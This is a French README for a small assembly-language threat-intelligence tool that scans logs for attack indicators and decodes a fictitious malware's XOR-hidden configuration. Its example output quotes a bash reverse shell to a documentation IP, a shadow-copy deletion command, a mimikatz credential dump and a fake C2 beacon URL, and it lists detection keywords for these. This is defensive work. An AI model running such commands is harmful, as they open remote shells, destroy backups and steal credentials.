# ioc-hunter : un petit outil CTI en assembleur x86-64

Un outil de **Cyber Threat Intelligence** écrit en assembleur x86-64 (NASM, Linux), **sans libc** : il n'utilise que des appels système (`open`, `read`, `write`, `exit`).

| Mode | Ce qu'il fait |
|---|---|
| `scan` | Cherche dans un fichier de logs des traces d'attaque (Mimikatz, PowerShell encodé, reverse shell, URL…) et affiche les lignes concernées |
| `xor` | Décode la configuration cachée d'un faux malware (XOR avec la clé 90) |

## Compilation

```bash
sudo apt install nasm
make          # compile ./ioc-hunter
make test     # 10 tests
make demo     # lance les 2 modes sur les échantillons
```

## Utilisation

```bash
./ioc-hunter scan samples/incident.log
./ioc-hunter xor  samples/payload.bin | strings
```

### Exemple : `scan`

```
[ALERTE] /dev/tcp/  ->  2026-11-12 08:15:40 bash[1201]: bash -c 'bash -i >& /dev/tcp/203.0.113.45/4444 0>&1'
[ALERTE] Delete Shadows  ->  [EventID 4688] NewProcess: vssadmin.exe Delete Shadows /all /quiet
[ALERTE] mimikatz  ->  [EventID 10] lsass access by C:\Temp\m.exe -> sekurlsa::logonpasswords (mimikatz)
```

### Exemple : `xor`

`samples/payload.bin` imite un malware qui cache sa configuration avec un XOR (clé 90). Une fois décodée, elle révèle l'adresse du serveur de l'attaquant :

```
v=2.1|c2=http://198.51.100.77:443/api/beacon|backup=https://cdn-sync.example.com/b.php|sleep=60
```

## Mots surveillés

| Mot | Pourquoi c'est suspect |
|---|---|
| `http://`, `https://` | URL (téléchargement, serveur de l'attaquant) |
| `powershell -enc` | PowerShell qui exécute du code caché |
| `mimikatz` | Vol de mots de passe |
| `Delete Shadows` | Un ransomware supprime les sauvegardes |
| `/dev/tcp/` | Reverse shell sous Linux |
| `chmod +x` | Rend un fichier téléchargé exécutable |
| `.onion` | Site Tor |

Pour ajouter un mot : une ligne `mot9 db "...", 0` dans `.data`, puis `mot9` dans `liste_mots` (avant le `0`).

## Limites

- La recherche respecte la casse : `Mimikatz` n'est pas reconnu, seul `mimikatz` l'est.
- Fichiers limités à 1 Mo.
- La clé XOR est fixe (90).

## Échantillons

Les fichiers de `samples/` sont **fictifs** : les IP viennent des plages réservées à la documentation (RFC 5737) et les domaines sont en `example.*`.
